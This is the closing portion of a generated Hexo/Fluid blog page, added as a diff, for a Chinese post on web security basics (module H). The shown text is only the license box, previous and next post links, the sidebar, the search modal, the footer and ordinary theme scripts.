+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Web 安全基础（H 模块）</div>
+      <div>https://happy-clown123.github.io/2026/08/31/H-web/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>KachaKacha</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2026年8月31日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2026/08/31/G-netsec/" title="网络安全基础（G 模块）">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">网络安全基础（G 模块）</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2026/08/31/I-re/" title="逆向工程基础（I 模块）">
+                        <span class="hidden-mobile">逆向工程基础（I 模块）</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    function isExpandAllEnabled() {
+      return CONFIG.toc && CONFIG.toc.expand_all === true;
+    }
+    function expandAllToc() {
+      if (!isExpandAllEnabled()) { return; }
+      jQuery('#toc-body .tocbot-is-collapsed').removeClass('tocbot-is-collapsed');
+    }
+    function updateTocToggle($li, $childList) {
+      var $toggle = $li.children('.toc-toggle');
+      if ($toggle.length === 0) { return; }
+      var collapsed = $childList.hasClass('tocbot-is-collapsed');
+      $toggle
+        .toggleClass('toc-toggle-collapsed', collapsed)
+        .toggleClass('toc-toggle-expanded', !collapsed);
+    }
+    function bindTocToggle() {
+      if (!isExpandAllEnabled()) { return; }
+      jQuery('#toc-body .toc-list-item').each(function() {
+        var $li = jQuery(this);
+        var $childList = $li.children('ol');
+        if ($childList.length === 0) {
+          if ($li.children('.toc-toggle').length === 0) {
+            $li.prepend('<span class="toc-toggle toc-toggle-placeholder" aria-hidden="true">›</span>');
+          }
+          return;
+        }
+
+        if ($li.children('.toc-toggle').length === 0) {
+          $li.prepend('<span class="toc-toggle toc-toggle-expanded" aria-hidden="true">›</span>');
+        }
+        updateTocToggle($li, $childList);
+      });
+      jQuery('#toc-body').off('click.tocToggle').on('click.tocToggle', '.toc-toggle', function(e) {
+        e.preventDefault();
+        e.stopPropagation();
+        var $li = jQuery(this).parent('.toc-list-item');
+        var $childList = $li.children('ol');
+        if ($childList.length === 0) { return; }
+        $childList.toggleClass('tocbot-is-collapsed');
+        updateTocToggle($li, $childList);
+      });
+      if (!window.__tocToggleObserver) {
+        window.__tocToggleObserver = new MutationObserver(function(mutations) {
+          mutations.forEach(function(mutation) {
+            if (mutation.type !== 'attributes' || mutation.attributeName !== 'class') { return; }
+            var $list = jQuery(mutation.target);
+            var $li = $list.parent('.toc-list-item');
+            if ($li.length === 0) { return; }
+            updateTocToggle($li, $list);
+          });
+        });
+        jQuery('#toc-body ol').each(function() {
+          window.__tocToggleObserver.observe(this, { attributes: true });
+        });
+      }
+    }
+    var tocConfig = Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc);
+    if (isExpandAllEnabled()) {
+      tocConfig.collapseDepth = 6;
+    }
+    window.tocbot.init(tocConfig);
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+    expandAllToc();
+    bindTocToggle();
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+        expandAllToc();
+        bindTocToggle();
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
